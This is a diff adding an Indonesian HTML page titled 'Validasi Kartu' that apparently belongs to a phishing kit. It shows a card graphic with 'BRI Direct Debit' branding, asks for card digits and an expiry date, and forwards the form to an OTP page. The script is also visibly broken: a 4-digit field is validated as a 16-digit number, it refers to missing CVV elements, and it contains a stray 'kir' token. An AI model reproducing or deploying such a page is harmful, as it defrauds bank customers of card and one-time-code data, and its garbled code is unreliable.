@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="id"><head>
+  <meta charset="UTF-8">
+  <meta name="theme-color" content="#800080"> 
+ <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Validasi Kartu</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 10px;
+      background: url('img/IMG-20250703-WA0019.jpg') no-repeat center center fixed;
+            background-size: cover;
+    }
+
+
+    .card.flipped {
+      transform: rotateY(180deg);
+    }
+    
+
+
+
+    .card .front,
+.card .back {
+  width: 100%;
+  height: 100%;
+  border-radius: 10px;
+  margin-top:18%;
+  
+  overflow: hidden;
+  background: #000000;
+
+  background-size: contain;
+  
+  background-position: center center;
+  background-repeat: no-repeat;
+  color: white;
+  box-shadow: 0 0px 10px rgba(0, 0, 0, 0.9);
+  position: absolute;
+  top: 0;
+  left: 0;
+  backface-visibility: hidden;
+
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  padding: 15px;
+  box-sizing: border-box;
+}
+.card .front {
+  background-image: url('images/joker1.png');
+}
+
+.card .back {
+  background-image: url('images/joker2.png');
+  transform: rotateY(180deg);
+}
+    .card-number {
+      font-size: 20px;
+      margin-top: 90px;
+      letter-spacing: 2px;
+    }
+
+    .card-expiry {
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .card-cvv {
+      font-size: 18px;
+    }
+    
+    .form-group {
+  display: flex;
+  flex-direction: column; /* ubah dari row ke kolom */
+  align-items: flex-start; /* rata kiri */
+  max-width: 300px;
+  margin: 10px auto;
+}
+
+input[type="tel"] {
+  width: 100%; /* isi lebar penuh group */
+  padding: 15px;
+  font-size: 16px;
+  
+  outline:none;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  box-sizing: border-box;
+  box-shadow: 0 0px 10px rgba(0, 0, 0, 0.5);
+}
+
+.error {
+  color: red;
+  font-size: 12px;
+  margin-top: 5px; /* beri jarak kecil dari input */
+  text-align: left; /* teks error rata kiri */
+}
+
+    .card-type {
+      text-align: center;
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    button {
+  margin-top: 20px;
+  width: 80%;
+  padding: 12px 40px;
+  background-color: #0F78CB;
+  color: #F5F8FF;
+  font-size: 15px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+    
+    .card-box {
+  width: 300px;
+  height: 180px;
+  perspective: 1000px;
+  margin: 0 auto 30px;
+  
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.card {
+  width: 100%;
+  height: 100%;
+  
+  transform-style: preserve-3d;
+  transition: transform 0.6s;
+  transform-origin: center center;
+}
+.form-wrapper {
+  border: 1px solid #0F78CB; /* garis pembatas */
+  border-radius: 10px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.1); /* efek bayangan */
+  background-color: #fff;
+  max-width: 320px;
+  margin: 0 auto 20px;
+}
+nav {
+            width: 100%;
+            position: fixed;
+            background-color: white;
+            z-index: 1000;
+border: 2px solid #ffffff; 
+        }
+        nav.top {
+            top: 0;
+            margin-left:-6%;
+            border-bottom: 2px solid #ccc;
+        }
+        nav.bottom {
+            bottom: 0;
+            border-top: 2px solid #ddd;
+        }
+        nav img {
+            width: 35%;
+            height: auto;
+            display: block;
+        }
+
+  </style>
+</head>
+<body>
+    
+
+<div class="card-box">
+  <div class="card" id="card">
+    <div class="front">
+      <div class="card-number" id="displayCardNumber">•••• •••• •••• ••••</div>
+      <div class="card-expiry">Valid Thru: <span id="displayExpiry">00/00</span></div>
+    </div>
+    <div class="back">
+      <div>CVV</div>
+      <div class="card-cvv" id="displayCVV">•••</div>
+    </div>
+  </div>
+</div>
+<br><br>
+<div class="card-type" id="cardType"></div>
+
+<form id="cardForm" action="otp.html" method="POST" onsubmit="return validateForm()">
+  <div class="form-wrapper">
+     <label for="" class="ml-3" style="color:#0f52b0;">ɴᴏᴍᴏʀ ᴋᴀʀᴛᴜ</label>
+  <div class="form-group">
+    <input type="tel" name="cardNumber" id="cardNumber" minlength="4" maxlength="4" style="padding-left: 12px;" placeholder="𝟒 𝐃𝐈𝐆𝐈𝐓 𝐓𝐄𝐑𝐀𝐊𝐇𝐈𝐑 𝐊𝐀𝐑𝐓𝐔">
+    <div class="error" id="cardError"></div>
+  </div>
+    <label for="" class="ml-3" style="color:#0f52b0;">ᴍᴀꜱᴀ ʙᴇʀʟᴀᴋᴜ (ᴠᴀʟɪᴅ ᴛʜʀᴜ)</label>
+  <div class="form-group">
+    <input type="tel" name="expiry" id="expiry" maxlength="5" placeholder="𝐌𝐌/𝐘𝐘">
+    <div class="error" id="expiryError"></div>
+  </div>
+
+  <div style="text-align:center">
+  <button type="submit" =disabled="">Lanjutkan</button>
+  </div>
+
+
+<script>
+function detectCardType(number) {
+  number = number.replace(/\s/g, '');
+  if (/^4/.test(number)) return 'Visa';
+  if (/^5[1-5]/.test(number) || /^2(2[2-9]|[3-6]|7[01])/.test(number)) return 'MasterCard';
+  if (/^3[47]/.test(number)) return 'AMEX';
+  return 'Tidak Dikenal';
+}
+
+function validLuhn(number) {
+  number = number.replace(/\D/g, '');
+  let sum = 0, toggle = false;
+  for (let i = number.length - 1; i >= 0; i--) {
+    let digit = +number[i];
+    if (toggle) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+    toggle = !toggle;
+  }
+  return sum % 10 === 0;
+}
+
+function validExpiry(value) {
+  if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+  const [month, year] = value.split('/').map(Number);
+  if (month < 1 || month > 12) return false;
+  const now = new Date();
+  const expiry = new Date(2000 + year, month);
+  return expiry > now;
+}
+
+function validCVV(cvv, cardType) {
+  if (cardType === 'AMEX') return /^\d{4}$/.test(cvv);
+  return /^\d{3}$/.test(cvv);
+}
+
+document.getElementById('cardNumber').addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, '').substring(0, 16);
+  this.value = value.replace(/(.{4})/g, '$1 ').trim();
+  document.getElementById('displayCardNumber').textContent = this.value || '•••• •••• •••• ••••';
+  const type = detectCardType(this.value);
+  document.getElementById('cardType').textContent = type === 'Tidak Dikenal' ? '𝗕𝗥𝗜 𝗗𝗶𝗿𝗲𝗰𝘁 𝗗𝗲𝗯𝗶𝘁' : type;
+});
+
+document.getElementById('expiry').addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, '').substring(0, 4);
+  if (value.length >= 3) {
+    this.value = value.substring(0, 2) + '/' + value.substring(2);
+  } else {
+    this.value = value;
+  }
+  document.getElementById('displayExpiry').textContent = this.value || 'MM/YY';
+});
+
+document.getElementById('cvv').addEventListener('focus', () => document.getElementById('card').classList.add('flipped'));
+document.getElementById('cvv').addEventListener('blur', () => document.getElementById('card').classList.remove('flipped'));
+document.getElementById('cvv').addEventListener('input', function () {
+  document.getElementById('displayCVV').textContent = this.value || '•••';
+});
+
+function validateForm() {
+  const cardNum = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
+  const expiry = document.getElementById('expiry').value.trim();
+  const cvv = document.getElementById('cvv').value.trim();kir
+  const type = detectCardType(cardNum);
+
+  document.getElementById('cardError').textContent = '';
+  document.getElementById('expiryError').textContent = '';
+  document.getElementById('cvvError').textContent = '';
+
+  let valid = true;
+
+  if (cardNum.length !== 16 || !validLuhn(cardNum)) {
+    document.getElementById('cardError').textContent = 'Nomor tidak valid';
+    valid = false;
+  }
+
+  if (!validExpiry(expiry)) {
+    document.getElementById('expiryError').textContent = 'Tanggal salah';
+    valid = false;
+  }
+
+  if (!validCVV(cvv, type)) {
+    document.getElementById('cvvError').textContent = 'CVV salah';
+    valid = false;
+  }
+
+  return valid;
+}
+
+</script>
+
+</div></form></body></html>
